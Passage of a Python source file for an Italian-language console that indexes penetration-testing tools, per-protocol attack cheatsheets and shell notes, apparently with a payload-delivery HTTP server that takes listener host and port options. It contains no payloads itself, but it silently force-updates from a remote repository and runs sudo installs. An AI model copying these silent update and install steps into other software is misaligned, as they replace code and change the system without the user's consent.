#!/usr/bin/env python3
from __future__ import annotations

import argparse
import importlib.util
import random
import re
import platform
import select
import textwrap
import subprocess
import sys
import shlex
from dataclasses import dataclass, field
from pathlib import Path
from shutil import get_terminal_size, which

from http_server import start as _serve_start, stop as _serve_stop, status as _serve_status, fetch_tools as _serve_fetch, list_static as _serve_list_static, discover_interfaces as _serve_discover_interfaces

try:
    import readline  # type: ignore
except ImportError:
    readline = None


APP_NAME = "SeaLion Console"
VERSION = "0.1.0"
ASCII_FILE = Path(__file__).with_name("ascii-art.txt")
SEALSAY_FILE = Path(__file__).with_name("sealion_say.txt")
PROJECT_ROOT = Path(__file__).resolve().parent
TOOL_ROOT = PROJECT_ROOT / "tool"
VULN_ROOT = PROJECT_ROOT / "vuln"
NOTES_ROOT = PROJECT_ROOT / "notes"
INSTALL_ROOT = Path.home() / ".sealionconsole" / "tools"
USER_BIN = Path.home() / ".local" / "bin"
GIF_FILE = PROJECT_ROOT / "assets" / "spinning.gif"


@dataclass
class ToolEntry:
    name: str
    path: Path
    install_file: Path
    help_file: Path


@dataclass
class ConsoleState:
    current_tool: ToolEntry | None = None
    current_vuln: str | None = None
    last_search_results: list[ToolEntry] = field(default_factory=list)
    last_vuln_tools: list[str] = field(default_factory=list)
    _find_results: list = field(default_factory=list)
    _find_query: str = ""


REPO_URL = "https://github.com/Starlix27/SeaLion.git"


def auto_update() -> None:
    if not (PROJECT_ROOT / ".git").is_dir():
        return
    try:
        r = subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "fetch", "--force", REPO_URL, "main"],
            capture_output=True, text=True, timeout=15,
        )
        if r.returncode != 0:
            return
        local = subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "rev-parse", "HEAD"],
            capture_output=True, text=True,
        ).stdout.strip()
        remote = subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "rev-parse", "FETCH_HEAD"],
            capture_output=True, text=True,
        ).stdout.strip()
        if not remote or local == remote:
            return
        subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "checkout", "."],
            capture_output=True, text=True, timeout=10,
        )
        subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "reset", "--hard", "FETCH_HEAD"],
            capture_output=True, text=True, timeout=15,
        )
        subprocess.run(
            ["git", "-C", str(PROJECT_ROOT), "clean", "-fd"],
            capture_output=True, text=True, timeout=10,
        )
        print(f"\033[92m[update]\033[0m Aggiornato a {remote[:7]}")
    except Exception:
        pass


def _auto_install_deps() -> None:
    if not is_linux():
        return
    missing = [pkg for pkg in ["chafa"] if not which(pkg)]
    if not missing:
        return
    try:
        subprocess.run(
            ["sudo", "-n", "apt", "install", "-y"] + missing,
            capture_output=True, timeout=30,
        )
    except Exception:
        pass


def load_logo() -> str:
    if ASCII_FILE.exists():
        content = ASCII_FILE.read_text(encoding="utf-8", errors="replace").rstrip()
        if content:
            return content
    return APP_NAME


def load_sealsay_art() -> str:
    if SEALSAY_FILE.exists():
        content = SEALSAY_FILE.read_text(encoding="utf-8", errors="replace").rstrip()
        if content:
            return content
    return load_logo()


def normalize(value: str) -> str:
    return value.strip().lower()


def is_linux() -> bool:
    return platform.system().lower() == "linux"


def discover_tools() -> list[ToolEntry]:
    tools: list[ToolEntry] = []
    for path in sorted(TOOL_ROOT.iterdir(), key=lambda p: p.name.lower()):
        if not path.is_dir() or path.name.startswith(".") or path.name.startswith("__"):
            continue
        install_file = path / "install.py"
        help_file = path / "help.md"
        if not help_file.exists():
            help_file = path / "help.txt"
        if install_file.exists() and help_file.exists():
            tools.append(ToolEntry(name=path.name, path=path, install_file=install_file, help_file=help_file))
    return tools


def find_tool(name: str) -> ToolEntry | None:
    needle = normalize(name)
    for tool in discover_tools():
        if normalize(tool.name) == needle:
            return tool
    return None


def _paged_print(lines: list[str], page_size: int = 30) -> None:
    if not sys.stdin.isatty() or len(lines) <= page_size:
        print("\n".join(lines))
        return
    import tty, termios
    for i, line in enumerate(lines):
        print(line)
        if (i + 1) % page_size == 0 and i + 1 < len(lines):
            sys.stdout.write("\033[93m--- Premi SPAZIO per continuare, Q per uscire ---\033[0m")
            sys.stdout.flush()
            fd = sys.stdin.fileno()
            old = termios.tcgetattr(fd)
            try:
                tty.setraw(fd)
                while True:
                    ch = sys.stdin.read(1)
                    if ch == " ":
                        break
                    if ch in ("q", "Q", "\x1b"):
                        sys.stdout.write("\r\033[K")
                        sys.stdout.flush()
                        return
            finally:
                termios.tcsetattr(fd, termios.TCSADRAIN, old)
            sys.stdout.write("\r\033[K")
            sys.stdout.flush()


def render_markdown(text: str) -> None:
    try:
        from rich.console import Console
        from rich.markdown import Markdown
        from io import StringIO
        buf = StringIO()
        console = Console(file=buf, force_terminal=True)
        console.print(Markdown(text))
        rendered = buf.getvalue()
    except ImportError:
        rendered = text
    _paged_print(rendered.splitlines())


TIPS_FILE = Path(__file__).with_name("tips.txt")


def load_tips() -> list[str]:
    if TIPS_FILE.exists():
        return [l for l in TIPS_FILE.read_text(encoding="utf-8", errors="replace").splitlines() if l.strip()]
    return ["SeaLion"]


def print_banner() -> None:
    tip = random.choice(load_tips())
    print_sealsay(tip)
    print(f"\n{APP_NAME} — personal tool vault\n")


def _read_sealsay_message(argv: list[str]) -> str:
    if argv:
        return " ".join(argv).strip()

    if not sys.stdin.isatty():
        piped = sys.stdin.read().strip()
        if piped:
            return piped

    return "SeaLion"


def _build_sealsay_bubble(message: str, max_width: int = 40) -> list[str]:
    wrapped: list[str] = []
    for raw_line in message.splitlines() or [""]:
        if len(raw_line) <= max_width:
            wrapped.append(raw_line)
        else:
            wrapped.extend(textwrap.wrap(raw_line, width=max_width) or [""])
    width = max(len(line) for line in wrapped)
    bubble: list[str] = []
    bubble.append(f" .{'─' * (width + 2)}.")
    for line in wrapped:
        bubble.append(f"│  {line.ljust(width)} │")
    bubble.append(f" '{'─' * (width + 2)}'")
    bubble.append(f"/")
    return bubble


def print_sealsay(message: str) -> None:
    art_lines = load_sealsay_art().splitlines()
    art_width = max(len(l) for l in art_lines) if art_lines else 0

    term_width = get_terminal_size((80, 24)).columns
    bubble_decoration = 6  # "│  " + " │"
    max_text = max(20, term_width - art_width - 2 - bubble_decoration)

    bubble_lines = _build_sealsay_bubble(message, max_width=max_text)
    bubble_height = len(bubble_lines)

    mouth_row = 6
    bubble_start = max(0, mouth_row - bubble_height)

    total = max(len(art_lines), bubble_start + bubble_height)
    for i in range(total):
        art_part = art_lines[i] if i < len(art_lines) else ""
        bubble_idx = i - bubble_start
        if 0 <= bubble_idx < bubble_height:
            print(f"{art_part:<{art_width}}  {bubble_lines[bubble_idx]}")
        else:
            print(art_part)


def cmd_sealsay(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    message = _read_sealsay_message(getattr(args, "message", []))
    print_sealsay(message)
    return 0


def print_tool_help(tool: ToolEntry) -> None:
    text = tool.help_file.read_text(encoding="utf-8", errors="replace").rstrip()
    render_markdown(text)


def print_tool_entry(tool: ToolEntry, index: int | None = None) -> None:
    if index is None:
        print(f"  - {tool.name}")
    else:
        print(f"  [{index}] {tool.name}")


def print_help_text() -> None:
    print()
    print("Comandi disponibili:")
    print("  list               Elenca i tool disponibili")
    print("  use <nome|num>     Seleziona un tool")
    print("  install [nome]     Installa il tool selezionato o specificato")
    print("  search <query>     Cerca tool per nome o testo")
    print("  find <parola>      Cerca un testo in vuln, tool e notes")
    print("  vuln <protocollo>  Mostra cheatsheet  (vuln list per elenco)")
    print("  notes <argomento>  Mostra una guida    (notes list per elenco)")
    print("  serve <azione>     Server HTTP di delivery (serve help per dettagli)")
    print("  sealsay [testo]    Stampa un messaggio in stile cowsay")
    print("  back               Torna alla console principale")
    print("  help               Mostra questo aiuto")
    print()
    print("  \033[1mESC\033[0m                Esci da " + APP_NAME)
    print("  \033[1mCtrl+C\033[0m             \033[95m~spin~\033[0m")


def get_install_dir(tool: ToolEntry) -> Path:
    return INSTALL_ROOT / tool.name


def load_install_module(tool: ToolEntry):
    spec = importlib.util.spec_from_file_location(f"sealionconsole_install_{tool.name}", tool.install_file)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def run_install(tool: ToolEntry) -> int:
    if not is_linux():
        print(f" {tool.name} è disponibile solo su Linux.", file=sys.stderr)
        return 1

    install_dir = get_install_dir(tool)
    install_dir.mkdir(parents=True, exist_ok=True)

    print(f"\nInstallazione di {tool.name}…")
    print(f"Destinazione: {install_dir}\n")

    try:
        mod = load_install_module(tool)
        rc = mod.install(install_dir)
    except Exception as exc:
        print(f"Errore durante l'installazione: {exc}", file=sys.stderr)
        return 1

    if rc != 0:
        return rc

    entry_point = getattr(mod, "ENTRY_POINT", None)
    if entry_point:
        publish_launcher(tool, install_dir, entry_point)

    return 0


def publish_launcher(tool: ToolEntry, install_dir: Path, entry_point_template: str) -> None:
    command = entry_point_template.format(dest=install_dir)

    USER_BIN.mkdir(parents=True, exist_ok=True)
    launcher_path = USER_BIN / tool.name
    launcher_body = (
        "#!/usr/bin/env bash\n"
        "set -euo pipefail\n"
        f'exec {command} "$@"\n'
    )
    launcher_path.write_text(launcher_body, encoding="utf-8")
    launcher_path.chmod(0o755)
    print(f"\nLauncher creato: {launcher_path}")

    if str(USER_BIN) not in (subprocess.run(["bash", "-lc", "echo $PATH"], capture_output=True, text=True).stdout or ""):
        print(f"  Assicurati che {USER_BIN} sia nel tuo PATH.")


def print_tool_context(tool: ToolEntry) -> None:
    print(f"\n--- {tool.name} ---")
    print(f"Cartella sorgente:       {tool.path}")
    print(f"Cartella installazione:  {get_install_dir(tool)}")
    print()
    print_tool_help(tool)
    print("\nDigita 'install' per installare, 'back' per tornare indietro.")


def tool_match_score(tool: ToolEntry, query: str) -> int:
    nq = normalize(query)
    name = normalize(tool.name)
    if name.startswith(nq):
        return 0
    if nq in name:
        return 1
    help_text = tool.help_file.read_text(encoding="utf-8", errors="replace").lower()
    if nq in help_text:
        return 2
    return -1


def resolve_target(target: str | None, state: ConsoleState | None) -> ToolEntry | None:
    if target is None:
        return state.current_tool if state is not None else None

    if target.isdigit() and state is not None:
        if state.current_vuln and state.last_vuln_tools:
            index = int(target) - 1
            if 0 <= index < len(state.last_vuln_tools):
                return find_tool(state.last_vuln_tools[index])
        tools = discover_tools()
        if state.last_search_results:
            tools = state.last_search_results
        index = int(target) - 1
        if 0 <= index < len(tools):
            return tools[index]

    return find_tool(target)


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="slconsole", add_help=False)
    parser.add_argument("-h", "--help", action="store_true")
    parser.add_argument("--version", action="store_true")
    subparsers = parser.add_subparsers(dest="command")
    sealsay_p = subparsers.add_parser("sealsay")
    sealsay_p.add_argument("message", nargs="*")
    subparsers.add_parser("list")
    install_p = subparsers.add_parser("install")
    install_p.add_argument("target", nargs="?")
    use_p = subparsers.add_parser("use")
    use_p.add_argument("target")
    subparsers.add_parser("back")
    search_p = subparsers.add_parser("search")
    search_p.add_argument("query", nargs="+")
    vuln_p = subparsers.add_parser("vuln")
    vuln_p.add_argument("protocol", nargs="+")
    notes_p = subparsers.add_parser("notes")
    notes_p.add_argument("topic", nargs="+")
    find_p = subparsers.add_parser("find")
    find_p.add_argument("query", nargs="+")
    serve_p = subparsers.add_parser("serve", add_help=False)
    serve_p.add_argument("action", nargs="?", default="status")
    serve_p.add_argument("subtopic", nargs="?", default=None)
    serve_p.add_argument("--port", type=int, default=8000)
    serve_p.add_argument("--lhost", default=None)
    serve_p.add_argument("--lport", type=int, default=4444)
    serve_p.add_argument("--force", action="store_true", default=False)
    return parser


def parse_console_command(line: str) -> list[str]:
    tokens = shlex.split(line)
    if tokens and tokens[0].lower() in {"slconsole", "sealion", "sealionconsole"}:
        return tokens[1:]
    return tokens


def setup_readline() -> None:
    pass


_COMPLETABLE = sorted(["sealsay", "list", "install", "use", "search", "vuln",
                        "notes", "find", "back", "help", "serve", "exit"])
_input_history: list[str] = []


def _play_ctrlc_gif() -> None:
    if not GIF_FILE.exists():
        print("\033[93m[!]\033[0m GIF non trovata in assets/spinning.gif")
        return

    cols, rows = get_terminal_size((80, 24))
    h = max(10, rows - 2)

    renderer = which("chafa") or which("img2txt")
    if not renderer:
        print("\033[93m[!]\033[0m Installa chafa per la GIF: sudo apt install chafa")
        return

    sys.stdout.write("\033[?1049h\033[H")
    sys.stdout.flush()

    try:
        if "chafa" in renderer:
            cmd = ["chafa", "-w", "9",
                   "-s", f"{cols}x{h}", "--duration=inf", str(GIF_FILE)]
            proc = subprocess.Popen(cmd, stderr=subprocess.DEVNULL)
            proc.wait()
        else:
            while True:
                proc = subprocess.Popen(
                    ["img2txt", "-W", str(cols), "-H", str(h), str(GIF_FILE)],
                    stderr=subprocess.DEVNULL,
                )
                proc.wait()
    except KeyboardInterrupt:
        try:
            proc.terminate()
            proc.wait(timeout=1)
        except Exception:
            pass
    finally:
        sys.stdout.write("\033[?1049l")
        sys.stdout.flush()


def _smart_input(prompt: str) -> str | None:
    """Input interattivo: ESC=esci, Ctrl+C=GIF. Ritorna None su ESC."""
    if not sys.stdin.isatty():
        try:
            return input(prompt)
        except EOFError:
            return None

    import tty, termios

    sys.stdout.write(prompt)
    sys.stdout.flush()

    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    buf: list[str] = []
    pos = 0
    hist_idx = len(_input_history)
    saved_buf: list[str] = []

    def refresh() -> None:
        text = "".join(buf)
        sys.stdout.write(f"\r\033[K{prompt}{text}")
        back = len(buf) - pos
        if back > 0:
            sys.stdout.write(f"\033[{back}D")
        sys.stdout.flush()

    try:
        tty.setraw(fd)
        while True:
            ch = sys.stdin.read(1)

            if ch == "\x1b":
                ch2 = sys.stdin.read(1)
                if ch2 == "[":
                    ch3 = sys.stdin.read(1)
                    if ch3 == "A" and _input_history:
                        if hist_idx > 0:
                            if hist_idx == len(_input_history):
                                saved_buf = list(buf)
                            hist_idx -= 1
                            buf = list(_input_history[hist_idx])
                            pos = len(buf)
                            refresh()
                    elif ch3 == "B":
                        if hist_idx < len(_input_history):
                            hist_idx += 1
                            buf = list(saved_buf) if hist_idx == len(_input_history) else list(_input_history[hist_idx])
                            pos = len(buf)
                            refresh()
                    elif ch3 == "C" and pos < len(buf):
                        pos += 1
                        sys.stdout.write("\033[C")
                        sys.stdout.flush()
                    elif ch3 == "D" and pos > 0:
                        pos -= 1
                        sys.stdout.write("\033[D")
                        sys.stdout.flush()
                    elif ch3 == "H":
                        pos = 0
                        refresh()
                    elif ch3 == "F":
                        pos = len(buf)
                        refresh()
                    elif ch3 == "3":
                        if select.select([sys.stdin], [], [], 0.2)[0]:
                            sys.stdin.read(1)
                        if pos < len(buf):
                            buf.pop(pos)
                            refresh()
                elif ch2 == "\x1b":
                    sys.stdout.write("\r\n")
                    sys.stdout.flush()
                    return None

            elif ch == "\x03":
                sys.stdout.write("\r\n")
                sys.stdout.flush()
                raise KeyboardInterrupt

            elif ch in ("\r", "\n"):
                sys.stdout.write("\r\n")
                sys.stdout.flush()
                line = "".join(buf)
                if line.strip():
                    _input_history.append(line)
                return line

            elif ch in ("\x7f", "\x08"):
                if pos > 0:
                    buf.pop(pos - 1)
                    pos -= 1
                    refresh()

            elif ch == "\x04":
                if not buf:
                    sys.stdout.write("\r\n")
                    sys.stdout.flush()
                    return None

            elif ch == "\x15":
                buf = buf[pos:]
                pos = 0
                refresh()

            elif ch == "\x0b":
                buf = buf[:pos]
                refresh()

            elif ch == "\x17":
                while pos > 0 and buf[pos - 1] == " ":
                    buf.pop(pos - 1); pos -= 1
                while pos > 0 and buf[pos - 1] != " ":
                    buf.pop(pos - 1); pos -= 1
                refresh()

            elif ch == "\x01":
                pos = 0
                refresh()

            elif ch == "\x05":
                pos = len(buf)
                refresh()

            elif ch == "\x0c":
                sys.stdout.write("\033[2J\033[H")
                refresh()

            elif ch == "\t":
                partial = "".join(buf[:pos]).lstrip()
                if partial and " " not in partial:
                    matches = [c for c in _COMPLETABLE if c.startswith(partial.lower())]
                    if len(matches) == 1:
                        tail = matches[0][len(partial):] + " "
                        for c in tail:
                            buf.insert(pos, c); pos += 1
                        refresh()
                    elif matches:
                        sys.stdout.write("\r\n  " + "  ".join(matches) + "\r\n")
                        refresh()

            elif 32 <= ord(ch) < 127:
                buf.insert(pos, ch)
                pos += 1
                refresh()

    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)


def run_command(argv: list[str], state: ConsoleState | None = None) -> int:
    parser = build_parser()
    try:
        args = parser.parse_args(argv)
    except SystemExit:
        return 1

    if args.version:
        print(f"{APP_NAME} {VERSION}")
        return 0

    if args.help or args.command is None:
        print_help_text()
        return 0

    handlers = {
        "sealsay": cmd_sealsay,
        "list": cmd_list,
        "install": cmd_install,
        "use": cmd_use,
        "back": cmd_back,
        "search": cmd_search,
        "vuln": cmd_vuln,
        "notes": cmd_notes,
        "find": cmd_find,
        "serve": cmd_serve,
    }
    handler = handlers.get(args.command)
    if handler is None:
        print_help_text()
        return 1
    return handler(args, state)


def run_console() -> int:
    state = ConsoleState()
    print_banner()
    print("Digita 'help' per i comandi, \033[1mESC\033[0m per uscire.")
    while True:
        prompt = f"\033[94mConsole({state.current_tool.name})> \033[0m" if state.current_tool else f"\033[94mslconsole({state.current_vuln})> \033[0m" if state.current_vuln else "\033[94mslconsole> \033[0m"
        try:
            line = _smart_input(prompt)
        except KeyboardInterrupt:
            _play_ctrlc_gif()
            continue

        if line is None:
            print("**Auh! Auh! Ouh!**")
            return 0

        line = line.strip()
        if not line:
            continue

        lowered = line.lower()
        if lowered in {"exit", "quit"}:
            return 0
        if lowered in {"help", "?"}:
            if state.current_tool:
                print_tool_context(state.current_tool)
            else:
                print_help_text()
            continue
        if lowered == "back":
            state.current_tool = None
            state.current_vuln = None
            state.last_vuln_tools = []
            state._find_results = []
            state._find_query = ""
            print("Tornato alla console principale.")
            continue

        argv = parse_console_command(line)
        if not argv:
            continue

        if argv[0] == "serve" and len(argv) >= 2 and argv[1] in {"-h", "--help"}:
            argv = ["serve", "help"] + argv[2:]

        if state.current_tool is not None and argv[0] == "install" and len(argv) == 1:
            rc = run_install(state.current_tool)
            if rc != 0:
                print(f"Installazione terminata con errore (codice {rc}).")
            continue

        if argv[0] == "use" and len(argv) == 2 and argv[1].isdigit() and state._find_results:
            idx = int(argv[1]) - 1
            if 0 <= idx < len(state._find_results):
                src, label, file_path, _ = state._find_results[idx]
                text = file_path.read_text(encoding="utf-8", errors="replace")
                _render_highlighted(text, state._find_query)
                if src == "tool":
                    tool = find_tool(label)
                    if tool:
                        state.current_tool = tool
                        state.current_vuln = None
                        state.last_vuln_tools = []
                elif src == "vuln":
                    state.current_vuln = file_path.stem
                    state.current_tool = None
                    state.last_vuln_tools = _extract_vuln_tools(text)
                continue

        known_commands = {"sealsay", "list", "install", "use", "search", "vuln", "notes", "find", "back", "help", "?", "--version", "-h", "--help", "serve"}
        if argv[0] not in known_commands:
            print("Comando non riconosciuto. Digita 'help' per i comandi.")
            continue

        rc = run_command(argv, state)
        if rc != 0 and rc != 1:
            print(f"Comando terminato con codice {rc}.")


def cmd_list(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    tools = discover_tools()
    if not tools:
        print("Nessun tool trovato.")
        print("Per aggiungere un tool, crea una cartella con install.py e help.md.")
        return 0
    print(f"\nTool disponibili ({len(tools)}):\n")
    for index, tool in enumerate(tools, start=1):
        print_tool_entry(tool, index)
    print()
    return 0


def _read_key() -> str:
    import tty, termios
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
        if ch == "\x1b":
            ch2 = sys.stdin.read(1)
            if ch2 == "[":
                ch3 = sys.stdin.read(1)
                if ch3 == "C":
                    return "right"
                if ch3 == "D":
                    return "left"
            return "esc"
        if ch in ("\r", "\n"):
            return "enter"
        if ch == "q":
            return "quit"
        return ch
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)


PAGE_SIZE = 5


def _print_search_page(results: list, query: str, page: int) -> int:
    total = len(results)
    total_pages = (total + PAGE_SIZE - 1) // PAGE_SIZE
    start = page * PAGE_SIZE
    end = min(start + PAGE_SIZE, total)
    print(f"\033[2J\033[H", end="")
    print(f"\nRisultati per '{query}' ({total} trovati):\n")
    for i in range(start, end):
        print_tool_entry(results[i], i + 1)
    print(f"\n  Pagina {page + 1}/{total_pages}", end="")
    if total_pages > 1:
        print("  [← →] naviga  [q] esci", end="")
    print("\n")
    return total_pages


def cmd_search(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    query = " ".join(args.query) if isinstance(args.query, list) else args.query
    query = normalize(query)
    scored = [(t, tool_match_score(t, query)) for t in discover_tools()]
    matches = sorted([(t, s) for t, s in scored if s >= 0], key=lambda x: x[1])
    if not matches:
        print("Nessun risultato.")
        return 0
    results = [t for t, _ in matches]
    if state is not None:
        state.last_search_results = results

    total_pages = _print_search_page(results, query, 0)
    if total_pages <= 1:
        return 0

    page = 0
    interactive = sys.stdin.isatty()
    if not interactive:
        return 0

    while True:
        key = _read_key()
        if key == "right" and page < total_pages - 1:
            page += 1
            _print_search_page(results, query, page)
        elif key == "left" and page > 0:
            page -= 1
            _print_search_page(results, query, page)
        elif key in ("quit", "esc", "enter"):
            break
    return 0


def cmd_use(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    if state is None:
        print("Il comando 'use' è disponibile solo nella console interattiva.", file=sys.stderr)
        return 1
    tool = resolve_target(args.target, state)
    if not tool:
        print(f"Tool non trovato: {args.target}", file=sys.stderr)
        return 1
    state.current_tool = tool
    state.current_vuln = None
    state.last_vuln_tools = []
    print_tool_context(tool)
    return 0


def cmd_back(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    if state is None:
        return 0
    state.current_tool = None
    state.current_vuln = None
    state.last_vuln_tools = []
    print("Tornato alla console principale.")
    return 0


def cmd_install(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    target = getattr(args, "target", None)
    tool = resolve_target(target, state)
    if not tool:
        print("Nessun tool selezionato. Usa 'install <nome>' oppure prima 'use <nome>'.", file=sys.stderr)
        return 1
    return run_install(tool)


# ---------------------------------------------------------------------------
# vuln command — vulnerability cheatsheets per protocollo (file-based)
# ---------------------------------------------------------------------------

VULN_CATEGORIES: dict[str, list[str]] = {
    "Trasferimento File": ["ftp", "smb", "nfs"],
    "DNS & Ricognizione": ["dns"],
    "Email": ["smtp", "imap-pop3"],
    "Monitoraggio Rete": ["snmp"],
    "Database": ["mysql", "mssql", "oracle-tns"],
    "Accesso Remoto": ["ssh", "rdp", "winrm", "wmi"],
    "Hardware & Management": ["ipmi"],
}

VULN_ALIASES: dict[str, str] = {
    "imap": "imap-pop3", "pop3": "imap-pop3", "pop": "imap-pop3",
    "imap pop3": "imap-pop3", "imap/pop3": "imap-pop3", "dovecot": "imap-pop3",
    "oracle": "oracle-tns", "tns": "oracle-tns", "oracletns": "oracle-tns", "oracle tns": "oracle-tns",
    "samba": "smb", "cifs": "smb", "netbios": "smb", "rpc": "smb",
    "ftps": "ftp", "tftp": "ftp", "sftp": "ftp", "vsftpd": "ftp",
    "bind": "dns", "bind9": "dns", "nslookup": "dns", "dig": "dns",
    "sshd": "ssh", "openssh": "ssh",
    "mstsc": "rdp", "xfreerdp": "rdp", "rdesktop": "rdp",
    "idrac": "ipmi", "ilo": "ipmi", "bmc": "ipmi",
    "postfix": "smtp", "sendmail": "smtp",
    "nfsd": "nfs", "portmapper": "nfs",
    "mssqlserver": "mssql", "sqlserver": "mssql",
    "mariadb": "mysql", "mysqld": "mysql",
}

VULN_NAMES: dict[str, str] = {
    "ftp": "FTP — File Transfer Protocol",
    "smb": "SMB — Server Message Block",
    "nfs": "NFS — Network File System",
    "dns": "DNS — Domain Name System",
    "smtp": "SMTP — Simple Mail Transfer Protocol",
    "imap-pop3": "IMAP/POP3 — Protocolli di lettura email",
    "snmp": "SNMP — Simple Network Management Protocol",
    "mysql": "MySQL — Database Relazionale",
    "mssql": "MSSQL — Microsoft SQL Server",
    "oracle-tns": "Oracle TNS — Transparent Network Substrate",
    "ipmi": "IPMI — Intelligent Platform Management Interface",
    "ssh": "SSH — Secure Shell",
    "rdp": "RDP — Remote Desktop Protocol",
    "winrm": "WinRM — Windows Remote Management",
    "wmi": "WMI — Windows Management Instrumentation",
}


NOTES_CATEGORIES: dict[str, list[str]] = {
    "Metodologia": ["footprinting", "info-gathering"],
    "Offensive": ["shells", "password-cracking", "network-services"],
    "Protocolli": ["ssh-notes", "impacket-notes"],
    "Sistemi Operativi": ["windows-powershell"],
}

NOTES_NAMES: dict[str, str] = {
    "footprinting": "Footprinting — Metodologia di Enumerazione",
    "info-gathering": "Information Gathering — Ricognizione",
    "shells": "Shell & Post-Exploitation — Reverse, Bind, Web Shell, PrivEsc",
    "password-cracking": "Password Cracking — JtR & Hashcat",
    "network-services": "Network Services — WinRM, SSH, RDP, SMB",
    "ssh-notes": "SSH — Note Operative",
    "impacket-notes": "Impacket — Toolkit Python per reti Windows",
    "windows-powershell": "Windows PowerShell — Comandi Facili con Equivalenti Linux",
}


def discover_vulns() -> list[str]:
    if not VULN_ROOT.is_dir():
        return []
    return sorted(p.stem for p in VULN_ROOT.glob("*.md"))


def discover_notes() -> list[str]:
    if not NOTES_ROOT.is_dir():
        return []
    return sorted(p.stem for p in NOTES_ROOT.glob("*.md"))


def _extract_vuln_tools(md_text: str) -> list[str]:
    tools: list[str] = []
    in_section = False
    for line in md_text.splitlines():
        if line.startswith("## Tool consigliati"):
            in_section = True
            continue
        if in_section:
            if line.startswith("## "):
                break
            stripped = line.strip()
            if stripped.startswith("- **") and "**" in stripped[4:]:
                name = stripped[4:stripped.index("**", 4)]
                tools.append(name)
    return tools


def cmd_vuln(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    raw = " ".join(args.protocol) if isinstance(args.protocol, list) else args.protocol
    key = normalize(raw)

    if key in {"list", "*", "all"}:
        md_parts = ["# Protocolli disponibili\n"]
        available = set(discover_vulns())
        for cat_name, cat_protos in VULN_CATEGORIES.items():
            cat_items = [p for p in cat_protos if p in available]
            if not cat_items:
                continue
            md_parts.append(f"## {cat_name}\n")
            md_parts.append("| Protocollo | Nome |")
            md_parts.append("|------------|------|")
            for proto_key in cat_items:
                name = VULN_NAMES.get(proto_key, proto_key)
                md_parts.append(f"| `{proto_key}` | {name} |")
            md_parts.append("")
        uncategorized = available - {p for ps in VULN_CATEGORIES.values() for p in ps}
        if uncategorized:
            md_parts.append("## Altro\n")
            md_parts.append("| Protocollo | Nome |")
            md_parts.append("|------------|------|")
            for proto_key in sorted(uncategorized):
                name = VULN_NAMES.get(proto_key, proto_key)
                md_parts.append(f"| `{proto_key}` | {name} |")
            md_parts.append("")
        md_parts.append(f"**Alias supportati:** `{'`, `'.join(sorted(VULN_ALIASES.keys()))}`\n")
        render_markdown("\n".join(md_parts))
        return 0

    key = VULN_ALIASES.get(key, key)
    vuln_file = VULN_ROOT / f"{key}.md"

    if not vuln_file.exists():
        print(f"Protocollo '{raw}' non trovato.", file=sys.stderr)
        print("Usa 'vuln list' per vedere i protocolli disponibili.")
        return 1

    md_text = vuln_file.read_text(encoding="utf-8", errors="replace")
    render_markdown(md_text)

    if state is not None:
        state.current_vuln = key
        state.current_tool = None
        tools = _extract_vuln_tools(md_text)
        state.last_vuln_tools = tools
        if tools:
            print(f"\nUsa 'use <num>' per selezionare un tool consigliato (1-{len(tools)}).")

    return 0


def cmd_notes(args: argparse.Namespace, state: ConsoleState | None = None) -> int:
    raw = " ".join(args.topic) if isinstance(args.topic, list) else args.topic
    key = normalize(raw)

    if key in {"list", "*", "all"}:
        md_parts = ["# Note disponibili\n"]
        available = set(discover_notes())
        for cat_name, cat_notes in NOTES_CATEGORIES.items():
            cat_items = [n for n in cat_notes if n in available]
            if not cat_items:
                continue
            md_parts.append(f"## {cat_name}\n")
            md_parts.append("| Chiave | Nome |")
            md_parts.append("|--------|------|")
            for note_key in cat_items:
                name = NOTES_NAMES.get(note_key, note_key)
                md_parts.append(f"| `{note_key}` | {name} |")
            md_parts.append("")
        uncategorized = available - {n for ns in NOTES_CATEGORIES.values() for n in ns}
        if uncategorized:
            md_parts.append("## Altro\n")
            md_parts.append("| Chiave | Nome |")
            md_parts.append("|--------|------|")
            for note_key in sorted(uncategorized):
                name = NOTES_NAMES.get(note_key, note_key)
                md_parts.append(f"| `{note_key}` | {name} |")
            md_parts.append("")
        render_markdown("\n".join(md_parts))
        return 0

    note_file = NOTES_ROOT / f"{key}.md"

    if not note_file.exists():
        print(f"Nota '{raw}' non trovata.", file=sys.stderr)
        print("Usa 'notes list' per vedere le note disponibili.")
        return 1

    md_text = note_file.read_text(encoding="utf-8", errors="replace")
    render_markdown(md_text)
    return 0


def _collect_find_matches(query: str) -> list[tuple[str, str, Path, list[str]]]:
    """Return list of (source_type, label, file_path, context_lines) for matches."""
    nq = normalize(query)
    results: list[tuple[str, str, Path, list[str]]] = []

    for vuln_file in sorted(VULN_ROOT.glob("*.md")) if VULN_ROOT.is_dir() else []:
        text = vuln_file.read_text(encoding="utf-8", errors="replace")
        if nq in text.lower():
            ctx = _extract_context(text, nq)
            label = VULN_NAMES.get(vuln_file.stem, vuln_file.stem)
            results.append(("vuln", label, vuln_file, ctx))

    for tool in discover_tools():
        text = tool.help_file.read_text(encoding="utf-8", errors="replace")
        if nq in text.lower():
            ctx = _extract_context(text, nq)
            results.append(("tool", tool.name, tool.help_file, ctx))

    for note_file in sorted(NOTES_ROOT.glob("*.md")) if NOTES_ROOT.is_dir() else []:
        text = note_file.read_text(encoding="utf-8", errors="replace")
        if nq in text.lower():
            ctx = _extract_context(text, nq)
            label = NOTES_NAMES.get(note_file.stem, note_file.stem)
